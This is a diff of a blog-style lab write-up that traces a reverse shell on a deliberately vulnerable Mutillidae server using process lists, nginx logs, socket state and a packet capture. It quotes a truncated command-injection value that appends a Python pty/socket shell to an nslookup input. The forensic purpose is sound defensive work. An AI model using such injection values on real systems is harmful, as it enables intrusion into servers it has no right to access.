@@ -55,7 +55,7 @@ www-data    3868  0.0  0.5  18648 11736 ?        S    16:13   0:00 python3 -c im
 root        3886  0.0  0.1   6544  2328 pts/4    S+   16:18   0:00 grep --color=auto -E python
 ```
 
-*Analysis:* The output clearly shows that the `www-data` user, which normally runs the web service, executed the following command:
+The output clearly shows that the `www-data` user, which normally runs the web service, executed the following command:
 
 `nslookup google.com; python3 -c 'import os,pty,socket...'`
 
@@ -82,7 +82,7 @@ tail -f /var/log/nginx/access.log
 10.10.10.149 - - [26/Jun/2026:16:14:15 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 504 176 "https://mutillidae.owasp.hacking/index.php?page=dns-lookup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
 ```
 
-*Analysis:* The access log shows multiple HTTP POST requests targeting `/index.php?page=dns-lookup.php` from the attacker's IP address (`10.10.10.149`).
+The access log shows multiple HTTP POST requests targeting `/index.php?page=dns-lookup.php` from the attacker's IP address (`10.10.10.149`).
 
 This finding is consistent with the process observed earlier. The attacker abused the DNS Lookup functionality to inject additional commands, as shown by the `nslookup google.com` command inside the payload. Although the HTTP request itself appears legitimate, the server-side process reveals that arbitrary commands were executed after the request was processed.
 
@@ -106,7 +106,7 @@ ESTAB         0         0               10.10.10.2:49342       10.10.10.149:9001
 ...
 ```
 
-*Analysis:* The output shows an `ESTABLISHED` TCP connection from the server (`10.10.10.2`) to the attacker's machine (`10.10.10.149`) on port `9001`. More importantly, the connection is owned by the `python3` process (PID 3868), matching the process identified in the previous step. This correlation confirms that the Python process is responsible for maintaining the reverse shell session.
+The output shows an `ESTABLISHED` TCP connection from the server (`10.10.10.2`) to the attacker's machine (`10.10.10.149`) on port `9001`. More importantly, the connection is owned by the `python3` process (PID 3868), matching the process identified in the previous step. This correlation confirms that the Python process is responsible for maintaining the reverse shell session.
 
 To inspect the network traffic in more detail, I captured packets using `tcpdump`.
 
@@ -131,7 +131,7 @@ E..d..@.@..5
 eksQr..)www-data@server01:/var/www/hack/mutillidae/src$
 ```
 
-*Analysis:* Because the reverse shell communication is transmitted without encryption, the session can be observed directly in plaintext. The packet capture reveals the interactive shell prompt: `www-data@server01:/var/www/hack/mutillidae/src$`. This confirms that the attacker successfully obtained an interactive shell on the target server.
+Because the reverse shell communication is transmitted without encryption, the session can be observed directly in plaintext. The packet capture reveals the interactive shell prompt: `www-data@server01:/var/www/hack/mutillidae/src$`. This confirms that the attacker successfully obtained an interactive shell on the target server.
 
 ---
 
@@ -147,7 +147,7 @@ One question naturally came to mind after completing this experiment:
 
 That question will be the starting point for the next article, where I plan to explore runtime detection using Falco.
 
-## Learning Resources & References
+## References
 
 **Tools & Utilities:**
 
